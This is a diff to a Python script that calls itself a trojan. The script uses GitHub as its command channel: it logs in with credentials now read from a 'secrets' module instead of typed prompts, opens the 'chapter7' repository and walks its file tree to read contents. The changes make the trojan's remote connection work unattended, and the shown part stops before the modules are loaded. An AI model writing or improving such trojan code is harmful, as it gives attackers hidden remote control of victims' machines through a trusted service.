@@ -9,6 +9,7 @@ import Queue
 import os
 
 from github3 import login
+import secrets
 
 trojan_id = "abc"
 
@@ -18,13 +19,15 @@ trojan_modules  = []
 configured      = False
 task_queue      = Queue.Queue()
 
+
 def connect_to_github():
     
-    username = input("Input github username: ")
-    password = input("Input github password: ")
+    git_credentials = json.loads(secrets.get_secret())
+    username = git_credentials['username']
+    password = git_credentials['password']
     
     gh = login(username=username, password=password)
-    repo = gh.repository("yourusername", "chapter7")
+    repo = gh.repository(username, "chapter7")
     branch = repo.branch("master")
     
     return gh,repo,branch
@@ -32,7 +35,7 @@ def connect_to_github():
 def get_file_contents(filepath):
     
     gh, repo, branch = connect_to_github()
-    tree = branch.commit.commit.tree.recurse()
+    tree = branch.commit.commit.tree.to_tree().recurse()
     
     for filename in tree.tree:
         
